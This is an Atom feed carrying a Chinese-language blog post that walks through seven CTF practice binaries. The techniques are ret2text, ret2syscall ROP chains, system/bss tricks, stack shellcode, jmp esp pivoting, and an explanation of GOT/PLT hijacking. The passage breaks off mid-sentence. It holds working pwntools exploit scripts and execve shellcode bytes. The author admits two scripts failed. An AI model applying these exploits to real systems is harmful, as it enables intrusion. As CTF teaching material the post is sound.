<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TT</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.pwntools.xyz/"/>
  <updated>2019-10-28T14:44:25.314Z</updated>
  <id>https://blog.pwntools.xyz/</id>
  
  <author>
    <name>TT</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux PWN</title>
    <link href="https://blog.pwntools.xyz/2019/10/28/Linux-PWN/"/>
    <id>https://blog.pwntools.xyz/2019/10/28/Linux-PWN/</id>
    <published>2019-10-28T14:34:38.000Z</published>
    <updated>2019-10-28T14:44:25.314Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-Pwn"><a href="#Linux-Pwn" class="headerlink" title="Linux Pwn"></a>Linux Pwn</h2><p>之前分析过一些<code>MIPS</code>平台下的二进制，对<code>Linux</code>平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。</p><p>不说原理，只说思路跟解题方法</p><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn1" target="_blank" rel="noopener">pwn</a></p><p>在分析这道题目之前先使用<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener"><code>checksec</code></a>查看一下该程序的保护情况:</p><blockquote><p>checksec pwn1</p></blockquote><a id="more"></a><p><img src="http://file.smilehacker.net/1571474474731.png" alt="checksec pwn1"></p><p>可以看到开启了<code>NX enabled</code>保护。使用<code>IDA</code>查看下程序的代码</p><p><img src="http://file.smilehacker.net/1571474770735.png" alt="IDA加载程序"></p><p>发现程序调用了<code>gets</code>函数，并且没有做任何的处理，可以造成了缓冲区溢出。我们需要分析<code>&amp;s</code>到<code>EBP</code>的距离，因为<code>EBP</code>后存放的就是返回地址。 在32位的程序中，就是<code>ebp+4</code>。<code>Esp -&gt; ebp</code>, 地址从小到大。小地址栈顶，大地址栈底。 </p><h3 id="手动计算返回地址的偏移"><a href="#手动计算返回地址的偏移" class="headerlink" title="手动计算返回地址的偏移"></a>手动计算返回地址的偏移</h3><p>工具用起来比较简单，就不介绍了，直接通过手动分析。</p><p>工具 :  <a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">patternoffset</a> </p><p>先使用<code>GDB</code>加载程序,在<code>call _gets</code>前下断，然后运行程序，关于<code>GDB</code>的使用参考：<a href="https://blog.pwntools.xyz/2019/10/20/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#more">GDB</a></p><pre><code class="shell">pwndbg&gt; disassemble main #查看main函数的汇编代码Dump of assembler code for function main:   .... #不删掉篇幅太长   0x080486ae &lt;+102&gt;:    call   0x8048460 &lt;gets@plt&gt;   ....End of assembler dump.pwndbg&gt; b *main+102 #在main函数偏移102行处下断点Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.pwndbg&gt; r #运行程序</code></pre><p>运行结果如下:</p><p><img src="http://file.smilehacker.net/1571475799729.png" alt="GDB运行后栈帧的情况"></p><p>结合<code>IDA</code>的反编译结果计算<code>ESP</code>到<code>&amp;s</code>的偏移:</p><pre><code class="shell">ESP = 0xffffcfa0EBP = 0Xffffd028&amp;S = ESP + 1CH = 0xffffcfbc# &amp;s -&gt; $EBP的距离 offset offset = $EBP - $S = 6C[hex] = 108[DEC]# func return addressreturn address = 108 + 4 = 112</code></pre><h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果:"></a>验证结果:</h3><p>用<code>python</code>生成一段字符，然后输入程序，看出错时结果是不是为我们指定的结果</p><pre><code class="shell"># 在shell下执行python -c &quot;print &#39;A&#39;*112 + &#39;BBBB&#39; &quot; &gt; test# 在GDB中执行run &lt; test</code></pre><p>结果如下,可以看到<code>EIP</code>已经被劫持为<code>0X424242(BBBB)</code>:</p><p><img src="http://file.smilehacker.net/1571476789765.png" alt="EIP已被劫持"></p><h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>接下来尝试在程序中寻找调用系统命令地地方,在<code>IDA</code>中按<code>ALT+T</code>搜索<code>/bin/sh</code>，正好看到有,并且调用了<code>system</code>函数</p><p><img src="http://file.smilehacker.net/1571476973841.png" alt="IDA搜索结果"></p><p><img src="http://file.smilehacker.net/1571477030249.png" alt="IDA搜索结果"></p><p>接下来使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a>这个库来编写<code>EXP</code>:</p><pre><code class="python">from pwn import *pwn1 = process(&#39;./pwn1&#39;)sh = 0x804863apwn1.sendline(&#39;A&#39; * (112) + p32(sh))pwn1.interactive()</code></pre><p>运行后成功拿到<code>shell</code>,第一关很简单.</p><p><img src="http://file.smilehacker.net/1571477253129.png" alt="reverse shell"></p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn2" target="_blank" rel="noopener">pwn2</a></p><p><code>cheksec</code>检查保护情况</p><p><img src="http://file.smilehacker.net/1571477404317.png" alt="checksec检查保护"></p><p><code>IDA</code>查看代码</p><p><img src="http://file.smilehacker.net/1571478271475.png" alt="IDA查看代码"></p><p>跟第一关不同的是，这里没有<code>system</code>函数给我们调用了。</p><h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>Linux 的系统调用通过 <code>int 80h</code>实现，用<a href="https://zh.wikipedia.org/w/index.php?title=系统调用号&action=edit&redlink=1" target="_blank" rel="noopener">系统调用号</a>来区分入口函数。操作系统实现系统调用的基本过程是：</p><ul><li><p>应用程序调用库函数<code>（API）</code>；</p></li><li><p><code>API</code> 将系统调用号存入 <code>EAX</code>，然后通过中断调用使系统进入内核态；</p></li><li><p>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p></li><li><p>系统调用完成相应功能，将返回值存入 <code>EAX</code>，返回到中断处理函数；</p></li><li><p>中断处理函数返回到<code>API</code> 中；</p></li><li><p><code>API</code> 将<code>EAX</code>返回给应用程序。</p><p><code>Syscall</code>的函数调用规范为： <code>execve(“/bin/sh”, 0,0)</code></p></li></ul><p>汇编代码如下:</p><pre><code class="shell">pop eax,   # 系统调用号载入， execve为0xbpop ebx,     # 第一个参数， /bin/sh的stringpop ecx,    # 第二个参数，0pop edx,   # 第三个参数，0int 0x80,   # 执行系统调用</code></pre><p>由于程序内没有<code>system</code>调用，我们需要人为的构造。</p><h3 id="查找ROP链"><a href="#查找ROP链" class="headerlink" title="查找ROP链"></a>查找ROP链</h3><p>使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 查找我们需要的命令。从上面的分析可以知道我们需要对4个寄存器进行操作<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>edx</code></p><p>安装好<code>ROPgadget</code>后执行</p><pre><code class="shell"> ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;eax&quot;  ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ebx&quot;  ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ecx&quot;  ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;edx&quot;  ROPgadget --binary pwn2 --only &#39;int&#39; ROPgadget --binary pwn2 --string &#39;/bin/sh&#39;</code></pre><p>但是在执行寻找<code>ecx</code>之后发现有一条连续<code>pop ecx; pop ebx</code>的指令,我们可以直接用。当然，分开选用两条</p><pre><code class="assembly">pop ebx; ret pop ecx; ret</code></pre><p>也是完全可以的，但是这里并没有单条<code>pop ecx; ret</code>。不过我们在下面可以用<code>0x0806eb90</code>处这条指令加深理解</p><p> <img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p><p>寻找系统调用和需要执行命令的字符串</p><p><img src="http://file.smilehacker.net/1571497154238.png" alt="1571497154238"></p><p> 这里选择的每一个gadgets都含有<code>ret</code>是为了能够使得程序自动持续的选择堆栈中的指令依次执行。在构造这些gadgets之前，我们通过下面的堆栈指针移动图，来分析一下<code>eip</code>指针的移动，以及对应获取的数据内容。<code>ret</code>指令可以理解成去栈顶的数据作为下次跳转的位置。</p><pre><code class="assembly">eip = [esp];esp = esp+4;# 或者pop eip;</code></pre><p>此时,我们的堆栈布置如下:</p><p><img src="http://file.smilehacker.net/1571551902372.png" alt="堆栈结构"></p><p>整个堆栈的调用过程:</p><ol><li>执行<code>gets</code>函数，发生溢出，返回地址被淹没为<code>0x080bb196</code></li><li>跳转到<code>0x080bb196</code>执行代码，取出<code>0xb</code>并返回，栈帧下移到<code>0x0806eb91</code></li><li>跳转到<code>0x0806eb91</code>执行代码，取出<code>0</code>，再从<code>0x080be408</code>处取出<code>/bin/bash</code>，分别存入<code>ecx</code>,<code>edx</code>，返回,栈帧下移到<code>0x0806eb6a</code></li><li>跳转到<code>0x0806eb6a</code>执行代码，取出<code>0</code>存入<code>edx</code>,栈帧下移到<code>0x08049421</code>处</li><li>跳转到<code>0x08049421</code>执行<code>int 0x80</code>中断</li></ol><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *sh = process(&quot;./pwn2&quot;)pop_eax_ret = 0x080bb196pop_ecx_ebx_ret = 0x0806eb91pop_edx_ret = 0x0806eb6aint_x80 = 0x08049421binsh = 0x080be408payload = flat(    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0, binsh, pop_edx_ret,0 ,int_x80])sh.sendline(payload)sh.interactive()</code></pre><p>执行<code>EXP</code>，成功拿到<code>shell</code></p><p><img src="http://file.smilehacker.net/1571552245667.png" alt="success"></p><h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>我们用<code>0x0806eb90</code>处的指令重新布置栈帧,加深理解</p><p><img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p><p>那么此时的栈帧布局就是:</p><p><img src="http://file.smilehacker.net/1571553359527.png" alt="此时栈帧布局"></p><p>写出POC：</p><pre><code class="python">from pwn import *sh = process(&quot;./pwn2&quot;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90pop_edx_ret = 0x0806eb6aint_x80 = 0x08049421binsh = 0x080be408payload = flat(    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh,int_x80])sh.sendline(payload)sh.interactive()</code></pre><p>成功执行:</p><p><img src="http://file.smilehacker.net/1571553500352.png" alt="成功"></p><h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn3" target="_blank" rel="noopener">pwn</a></p><p><code>checksec</code>检查保护保护状态:</p><p><img src="http://file.smilehacker.net/1571554078794.png" alt="check检查保护状态"></p><p><code>IDA</code>查看汇编代码:</p><p><img src="http://file.smilehacker.net/1571554361586.png" alt="反编译"></p><p>基本跟第二道题目一样，但是我们像第二道题目一样去寻找<code>ROP</code>链的时候发现并没有找到合适的指令</p><p><img src="http://file.smilehacker.net/1571554491573.png" alt="寻找指令失败"></p><p>那也只能尝试其他的方法了,我们在<code>IDA</code>中查看下他的导入函数,发现其中有<code>system</code>函数,那我们直接调用这个函数即可</p><p><img src="http://file.smilehacker.net/1571554930443.png" alt="import导入函数"></p><p><img src="http://file.smilehacker.net/1571555353609.png" alt="SYSTEM函数调用"></p><p>有了<code>system</code>函数之后,用<code>ROPgadget</code>寻找一下<code>/bin/sh</code>这个字符串.</p><p><img src="http://file.smilehacker.net/1571555487359.png" alt="寻找/bin/sh"></p><h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><pre><code class="python">from pwn import *sh = process(&quot;./pwn3&quot;)system_addr= 0x08048460sh_addr = 0x08048720payload = flat([&#39;A&#39;*112, system_addr, 0xabcd1122, sh_addr])sh.sendline(payload)sh.interactive()</code></pre><p>这里需要注意, 为什么在<code>system_addr</code>和<code>sh_addr</code>中间会有4字节的空余部分?</p><p>在正常调用system函数的时候，堆栈位置的<code>system_addr</code>之后的内容为<code>system</code>函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在<code>systetem_addr</code>和<code>sh_addr</code>之间增加了4个字符来进行填充。 </p><h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn4" target="_blank" rel="noopener">pwn</a></p><p><code>checksec</code>检测程序保护机制</p><p><img src="http://file.smilehacker.net/1571556472396.png" alt="check检测"></p><p>还是一样的，我们再来看程序的导入表:</p><p><img src="http://file.smilehacker.net/1571556603660.png" alt="查看导入表"></p><p>发现是有<code>system</code>函数的，继续通过<code>ROPgadget</code>分析，发现没有<code>/bin/sh</code>字符串.</p><p><img src="http://file.smilehacker.net/1571556697767.png" alt="ROPgadgets分析"></p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在得想个法子。直观的想法是在<code>shellcode</code>中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样： </p><blockquote><p> payload = flat([‘a’ * 112, system_plt, 0xabcdabcd, “/bin/sh”]) </p></blockquote><p>看着可行,但是放在堆栈中的是程序执行的路线图(都是通过指针调用的)，而不是实际的程序或者字符串 。而 ”/bin/sh”对应的4个字节的地址所指向的内存空间明显不合法。但是如果我们可以把<code>/bin/sh</code>塞到一个变量中，然后让<code>system</code>函数去调用他。我们就可以达到目的。可是这个变量哪里找了？我们可以去看<code>ELF</code>程序的<code>bss</code>段，<code>bss</code>段用于存放程序中未经初始化的全局变量和静态局部变量 。很巧，正好有一个。</p><p><img src="http://file.smilehacker.net/1571557290759.png" alt="bss段"></p><p>有了地址之后,一个新的问题产生,我们要怎么把<code>/bin/sh</code>塞到<code>buf2</code>这个变量中? 看看导入函数,那个<code>gets</code> :kissing_heart:</p><h3 id="EXP编写-2"><a href="#EXP编写-2" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>下面这一段原文作者没有写，都是个人理解，有可能不对，可以看文末的链接</p><p>在写<code>EXP</code>之前,我们需要分析一下我们现在的栈帧应该怎么布置:</p><p><img src="http://file.smilehacker.net/1571558124555.png" alt="栈帧的布置"></p><p>看上去还行，但是又有一个新的问题,<code>gets</code>函数执行完的返回地址我们要怎么填写?程序会被这个返回地址直接带跑，直接填成<code>system</code>的地址？那参数又怎么给到system？</p><p>作者在这里的思路是很巧妙的<code>gets</code>函数的返回地址处存指向一条<code>pop x</code>,pop谁都可以，我们主要是利用<code>pop</code>的<code>esp+4</code>的功能。</p><pre><code class="shell">ROPgadget --binary pwn4 --only &#39;pop|ret&#39;</code></pre><p>用第一条第三条都可以。</p><p><img src="http://file.smilehacker.net/1571558379470.png" alt="ROPgadget运行结果"></p><p>整个运行过程如下:</p><ol><li>程序接收输入,缓冲区溢出,返回地址被淹没成<code>gets</code>函数,并从栈中获取参数</li><li>gets函数执行，将<code>/bin/sh</code>设置到<code>buf2</code>中，gets函数执行完成</li><li>程序去我们设置的<code>gets</code>函数执行完的返回地址中执行<code>pop; ret</code>指令</li><li><code>system</code>函数开始执行</li></ol><p>EXP：</p><pre><code class="python">from pwn import *sh = process(&quot;./pwn4&quot;)shelf = ELF(&quot;./pwn4&quot;)gets_plt = shelf.plt[&#39;gets&#39;]system_plt = shelf.plt[&#39;system&#39;]pop_ebp = 0x0804872fbuf2 = 0x0804A080payload = flat(    [&#39;A&#39;*112, gets_plt, pop_ebp, buf2, system_plt, 0xabababab, buf2])sh.sendline(payload)sh.sendline(&#39;/bin/sh&#39;)sh.interactive()</code></pre><p>成功获得<code>shell</code></p><p><img src="http://file.smilehacker.net/1571558914053.png" alt="成功"></p><h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn5" target="_blank" rel="noopener">pwn</a></p><p><code>checksec</code>检查保护情况:</p><p><img src="http://file.smilehacker.net/1571559117913.png" alt="checksec"></p><p>发现关闭了<code>NX</code>保护,也就是说可以在堆栈上执行代码了,但是开启了<code>PIE</code>保护,也就是地址随机化,而且程序也变成了64位程序。</p><blockquote><p>PS: 之前看逆向工程权威指南隐约记得传参不一样,这里刚好又出现了。</p><p><code>MSVC</code>和<code>GCC</code>在传参时的不同: </p><ul><li><code>GCC</code>编译的程序在入参时使用<code>mov</code>指令来传参,不像<code>MSVC</code>传参使用push和pop</li></ul><p><code>GCC</code>编译64位程序和32位程序入参时的不同(对比上面的题目和本题目汇编代码即可看出):</p><ul><li><code>GCC</code>编译的32位程序在入参时是直接对堆栈进行操作的</li><li><code>GCC</code>编译的64位程序在入参时使用<code>RDI</code>,<code>RSI</code>,<code>RDX</code>,<code>RCX</code>,<code>R8</code>,<code>R9</code>传递前六个参数</li></ul><p><code>MSVC</code>编译64位程序和32位程序入参时的不同(没有例子):</p><ul><li><code>MSVC</code>编译的32位程序直接使用push指令入栈</li><li><code>MSVC</code>编译的64位程序使用<code>RCX</code>,<code>RDX</code>,<code>R8</code>,<code>R9</code>传递前4个参数</li></ul></blockquote><p><code>IDA</code>分析程序:</p><p><img src="http://file.smilehacker.net/1571559310062.png" alt="IDA分析pwn5"></p><h3 id="确定漏洞位置"><a href="#确定漏洞位置" class="headerlink" title="确定漏洞位置"></a>确定漏洞位置</h3><p>一眼就看到了<code>read</code>函数,但是他只读了<code>0x40</code>个字节(64)字节</p><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>现在很熟练了,偏移<code>0x10h</code>个字节,也就是16个字节.然后16+8=24，也就是我们在输入到24个字节是就可以覆盖返回地址</p><h3 id="查看可用函数"><a href="#查看可用函数" class="headerlink" title="查看可用函数"></a>查看可用函数</h3><p>看一下导入函数,发现啥也没</p><p><img src="http://file.smilehacker.net/1571559651228.png" alt="查看导入函数"></p><p>但是堆栈可以执行,我们需要直接放<code>shellcode</code>放在栈中,在这之前我们要计算一下堆栈中可以存放多少字节的<code>shellcode</code>。</p><blockquote><p>64 - 24 -8 =32 （返回地址自身的8个自己要记得计算)</p></blockquote><p><code>expoloit-db</code>上找一段下来:</p><pre><code class="assembly"># 23 bytes# https://www.exploit-db.com/exploits/36858/shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;</code></pre><p>好了,啥都有了,继续思考，怎么确定<code>payload</code>的地址?</p><p>那就是<code>buf</code>+32个字节,那新的问题又出来了,<code>buf</code>的地址没法确认(因为程序启用了随机化地址保护)</p><p>无解了。再回去看一下程序的代码，这个<code>printf</code>函数干了什么。它把<code>buf</code>的地址给打印出来了:sweat:</p><p>妙啊~</p><p>然后整理一下，看缓冲区怎么布置</p><p><img src="http://file.smilehacker.net/1571560805846.png" alt="缓冲区布置"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *sh = process(&#39;./pwn5&#39;)# 23 bytes# https://www.exploit-db.com/exploits/36858/shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;sh.recvuntil(&#39;[&#39;)buf_addr = sh.recvuntil(&#39;]&#39;, drop=True)buf_addr = int(buf_addr, 16)payload = &#39;b&#39; * 24 + p64(buf_addr + 32) + shellcode_x64sh.sendline(payload)sh.interactive()~                      </code></pre><p>参考一下就好,代码并不能运行。没有细看过<code>pwntools</code>模块,也就不做调试了。</p><h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6" target="_blank" rel="noopener">pwn</a></p><p><code>checksec</code>检查程序:</p><p><img src="http://file.smilehacker.net/1571561335922.png" alt="checksec检查pwn6"></p><p>啥也没开,别激动,不好搞。</p><p>IDA查看代码:</p><p><img src="http://file.smilehacker.net/1571561531179.png" alt="IDA分析pwn6"></p><h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>一眼就看到<code>gets</code>函数了,但是空间只有<code>0x32</code>即50字节</p><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>现在计算很快了,0x20 + 4 = 0x24 = 32个字节,即淹没32字节即可淹没返回地址</p><h3 id="导入函数表"><a href="#导入函数表" class="headerlink" title="导入函数表"></a>导入函数表</h3><p>不截图了, 没有<code>system</code>函数</p><h3 id="思考（想不通就配合下面的图片）"><a href="#思考（想不通就配合下面的图片）" class="headerlink" title="思考（想不通就配合下面的图片）"></a>思考（想不通就配合下面的图片）</h3><p>现在没招了,用<code>shellcode</code>? 看看现在的空间50-36-4=10，谁有10字节的<code>shellcode</code>赶紧拿出来。</p><p>溢出时没得想了，但是我们可以考虑把<code>shellcode</code>作为正常的参数传入栈中,而且栈也是有可执行权限的(没有启用<code>NX</code>)，这样,我们就有36个字节用来存放<code>shellcode</code>了。找到了新思路，我们需要思考两个问题</p><ol><li>如何找到<code>shellcode</code>起始地址</li><li>如何跳转到<code>sellcode</code>的起始地址</li></ol><p>先解决第一个问题</p><p> 漏洞函数产生的位置是在<code>vul</code>函数中,当<code>vul</code>函数执行完成后返回<code>main</code>函数栈帧,我们可以倒推回<code>s</code>的起始位置，即</p><blockquote><p>esp - 0x20(s的长度) -0x4(vul的返回地址) - 0x4(vul函数的ebp)=0x28</p></blockquote><p>所以,我们已经推算处<code>shellcode</code>的位置。</p><p>解决第二个问题</p><p>在函数的返回地址，我们需要一段指令让程序可以跳转到跳转到<code>esp</code>,这样才能继续执行栈帧上的代码:</p><pre><code class="shell">ROPgadget --binary stack_pivoting_1 --only &#39;jmp|ret&#39; | grep &#39;esp&#39;</code></pre><p><img src="http://file.smilehacker.net/1571571949860.png" alt="寻找jmp esp"></p><p>继续回到栈帧执行代码,我们在栈帧之后布置如下指令.</p><pre><code class="assembly">sub esp 0x28; jmp esp;</code></pre><p><code>shellcode</code>得到执行。</p><p>看一下当前栈帧的布局:</p><p><img src="http://file.smilehacker.net/1571572971883.png" alt="当前栈帧布局"></p><p>仔细想想,不太好懂。</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *sh = process(&#39;./pwn6&#39;)shellcode_x86 = &quot;x31xc9xf7xe1x51x68x2fx2fx73&quot;shellcode_x86 += &quot;x68x68x2fx62x69x6ex89xe3xb0&quot;shellcode_x86 += &quot;x0bxcdx80&quot;sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)jmp_esp = 0x08048504payload = shellcode_x86 + (    0x20 - len(shellcode_x86)) * &#39;b&#39; + &#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmpsh.sendline(payload)sh.interactive()</code></pre><p>没办法成功执行,换了个<code>x86</code>平台的shell，我感觉这个<code>shellcode</code>有问题！！</p><h2 id="七"><a href="#七" class="headerlink" title="七"></a>七</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7" target="_blank" rel="noopener">pwn7</a></p><p>上来还老规矩,使用<code>checksec</code>检查程序保护情况:</p><p><img src="http://file.smilehacker.net/1572240054879.png" alt="checksec检查pwn7"></p><p>只开启了<code>DEP</code>保护。<code>IDA</code>查看掠过，漏洞函数还是一样的，但是没有导入函数,没有合适的<code>Gadget</code>语句。怎么办？</p><p>劫持<code>GOT</code></p><h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><blockquote><p>修改某个被调用函数的地址，让其指向另一个函数。</p><p>example : 修改<code>printf()</code>函数的地址使其指向<code>system()</code>函数</p></blockquote><p>要实现上述过程，我们就需要理解一下函数调用时，程序是怎么找到被<code>调用函数</code>的？</p><p>程序在对外部的函数调用时需要在生成可执行文件时包含“外部函数的链接”到程序中,链接的方式分为两种：</p><ul><li>静态链接: 静态链接生成的可执行文件包含外部函数的全部代码</li><li>动态链接: 动态链接生成的可执行文件不包含外部函数的代码，而是运行时将，动态链接库（若干外部函数的集合）加载到内存的某个位置，在发生函数调用时去链接库定位所需的函数。 </li></ul><p>那就出现了一个新的问题。程序如何在链接库内定位到所需函数？这个过程用到两张表<code>GOT</code>和<code>PLT</code></p><ul><li><code>GOT</code>：全局偏移量表(<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able)， 用来存储外部函数在内存的确切地址。<ul><li><code>GOT</code>存储在数据段中(<code>Data Segment</code>)，<strong>可以在程序运行时被修改</strong></li></ul></li><li><code>GIT</code>：程序链接表(<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able)，用来存储外部函数的入口点。程序运行时到<code>PLT</code>表中寻找外部函数的地址。<ul><li><code>PLT</code>存储在代码段(Code Segment)内，在运行之前就已经确定并且不会被修改，所以<code>PLT</code> 并不会知道程序运行时动态链接库被加载的确切位置。 </li></ul></li></ul><p>那么<code>PLT</code>表内存储的入口点是什么?</p><ul><li><p>存储的是<code>GOT</code>表中对应条数的地址</p><p><img src="http://file.smilehacker.net/1572242662913.png" alt="PLT存储"></p></li></ul><p>既然外部函数地址都存放在<code>GOT</code>中,而不是<code>PLT</code>，<code>PLT</code>存储的入口点又指向<code>GOT</code>的对应条目，那程序为什么选在<code>PLT</code>作为函数的入口点，而不是<code>GOT</code>? 在程序启动时确定所有外部函数的内存地址并写入<code>GOT</code>表，之后只使用<code>GOT</code>表不是更方便吗？ </p><ul><li>这样设计的目的是因为效率。</li></ul><p><code>GOT</code>表的<strong>初始值</strong>都指向<code>PLT</code>表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。</p><p>当程序需要调用某个外部函数时，过程如下</p><ul><li>首先到<code>PLT</code>表内寻找对应的入口点，跳转到<code>GOT</code>表中。</li><li>第一次调用这个函数：<ul><li>程序会通过<code>GOT</code>表再次跳转回<code>PLT</code>表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉<code>GOT</code>表的初始值，之后再执行函数调用,</li></ul></li><li>不是第一次调用(再次调用)：<ul><li>程序仍然首先通过<code>PLT</code>表跳转到<code>GOT</code>表，此时<code>GOT</code>表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</li></ul></li></ul><p>第一次调用的示意图:</p><p> <img src="http://file.smilehacker.net/v2-b78288c5eb8bfd2568728f34fbbb0e9e_hd.png" alt="第一次调用"> </p><p>不是第一次调用的示意图:</p><p> <img src="http://file.smilehacker.net/v2-caa5320d0bb0101edad4b9127f6fe413_hd.png" alt="不是第一次调用"></p><p>上面的这个过程采用了<code>LAZY</code>设计思想, 它将需要完成的操作(解析外部函数的内存地址)留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。跟<code>python</code>中的生成器有点像，懒加载</p><p>这个过程也启示了我们如何实现函数的伪装，那就是到<code>GOT</code>表中将函数<code>A</code>的地址修改为函数<code>B</code>的地址。这样在后面所有对函数<code>A</code>的调用都会执行函数<code>B</code>。我们可以将目标分解成以下几个步骤:</p><ul><li>确定函数<code>A</code>在<code>GOT</code>表中的条目位置 </li><li>确定函数<code>B</code>在内存中的地址 </li><li>将函数<code>B</code>的地址写入函数<code>A</code>在<code>GOT</code>表中的条目</li></ul><p>第一个问题，如何确认函数<code>A</code>在<code>GOT</code>表中的位置?</p><p>这个问题好说，程序调用函数时是通过<code>PLT</code>表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到<code>PLT</code>表中该函数的入口点位置，从而定位到该函数在<code>GOT</code>中的条目。 </p><pre><code class="assembly">call 0x08048430 &lt;printf@plt&gt;</code></pre><p>就说明<code>printf</code>在<code>PLT</code>表中的入口点是在 <em>0x08048430*，所以 *0x08048430</em> 处存储的就是<code>GOT</code>表中<code>printf</code>的条目地址。 </p><p>第二个问题， 如何确定函数 B 在内存中的地址？ </p><p>如果开启了<code>ASLR</code>，程序每次动态加载的位置都是随机的，就很难直接定位函数位置。假如函数<code>B</code>已经调用过了，我们通过上一个问题的答案来拿到结果，但是，我们想要的函数系统一般又不会调用，<code>GOT</code>表中并没有相应的记录。那怎么办? 幸运的是，函数在动态链接库内的相对位置是固定的，在动态库打包生成时就已经确定。所以假如我们知道了函数<code>A</code>的运行时地址（读取<code>GOT</code>表内容），也知道函数<code>A</code>和函数<code>B</code>在动态链接库内的相对位置，就可以推算出函数<code>B</code>的运行时地址。 </p><p>最后，如何实现 GOT 表中数据的修改？ </p><p><code>ROP</code>,不多说了</p><p>从上面也可以看出，修改<code>GOT</code>表也可以在一定程度上绕过<code>ASLR</code></p><h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><p>看了上面的分析，应该是有个大概的思路了。这里的思路并不是修改某个函数的<code>got</code>记录，而是根据偏移计算出<code>system</code>的地址</p><p>先来想第一个问题，如何拿到<code>system</code>函数的地址?我们需要记住两点`</p><ul><li><code>system</code>函数属于<code>libc</code>，而<code>libc.so</code>动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有<code>ASLR</code>保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而<code>libc</code>在<code>github</code>上有人进行收集。<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc</a></li></ul><p>所以如果我们知道<code>libc</code>中某个函数的地址，那么我们就可以确定该程序利用的<code>libc</code>。进而我们就可以知道 